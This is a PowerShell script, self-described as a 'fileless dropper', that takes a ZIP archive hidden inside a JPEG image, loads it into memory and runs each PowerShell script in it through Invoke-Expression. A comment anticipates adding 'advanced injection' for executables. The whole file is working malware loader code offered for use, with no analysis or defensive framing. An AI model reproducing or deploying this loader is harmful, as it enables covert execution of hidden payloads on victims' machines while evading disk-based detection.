# --- Configuration ---
$embeddedImagePath = "C:\Users\Public\Pictures\image_with_payload.jpg"  # Image with embedded ZIP payload
$triggeredScripts = @()  # Will hold extracted PS scripts in memory

Add-Type -AssemblyName System.IO.Compression.FileSystem

# --- Function: Extract embedded ZIP bytes from image ---
function Get-EmbeddedZipBytes {
    param ([string]$imagePath)

    Write-Verbose "Reading image bytes..."
    $bytes = [System.IO.File]::ReadAllBytes($imagePath)

    # Find ZIP header (PK) bytes
    for ($i = 0; $i -lt $bytes.Length - 3; $i++) {
        if ($bytes[$i] -eq 0x50 -and $bytes[$i+1] -eq 0x4B) {
            Write-Verbose "ZIP header found at offset $i"
            return $bytes[$i..($bytes.Length - 1)]
        }
    }
    throw "No ZIP archive found in image."
}

# --- Function: Load ZIP archive from byte array ---
function Load-ZipArchiveFromBytes {
    param ([byte[]]$zipBytes)

    $ms = New-Object System.IO.MemoryStream(,$zipBytes)
    $zip = New-Object System.IO.Compression.ZipArchive($ms)
    return $zip
}

# --- Function: Run PowerShell script from string content ---
function Run-PayloadScriptFromString {
    param ([string]$scriptContent)

    Write-Verbose "Executing payload script..."
    try {
        Invoke-Expression $scriptContent
    } catch {
        Write-Warning "Error running script: $_"
    }
}

# --- Main Logic ---

try {
    Write-Output "[*] Starting fileless dropper..."

    # Extract ZIP bytes from embedded image
    $zipBytes = Get-EmbeddedZipBytes -imagePath $embeddedImagePath

    # Load ZIP archive in-memory
    $zipArchive = Load-ZipArchiveFromBytes -zipBytes $zipBytes

    # Enumerate entries, execute PowerShell scripts directly from memory
    foreach ($entry in $zipArchive.Entries) {
        Write-Verbose "Found entry: $($entry.FullName)"
        if ($entry.FullName -like "*.ps1") {
            # Read script content as string
            $reader = New-Object System.IO.StreamReader($entry.Open())
            $scriptText = $reader.ReadToEnd()
            $reader.Close()
            # Execute script content directly
            Run-PayloadScriptFromString -scriptContent $scriptText
        }
        elseif ($entry.FullName -match "\.exe$|\.bat$|\.cmd$") {
            # For binaries or batch files, just log (can add advanced injection later)
            Write-Warning "Binary or batch payload found: $($entry.FullName) - needs separate injection"
        }
    }

    Write-Output "[*] Fileless dropper execution completed."

} catch {
    Write-Error "Dropper error: $_"
}
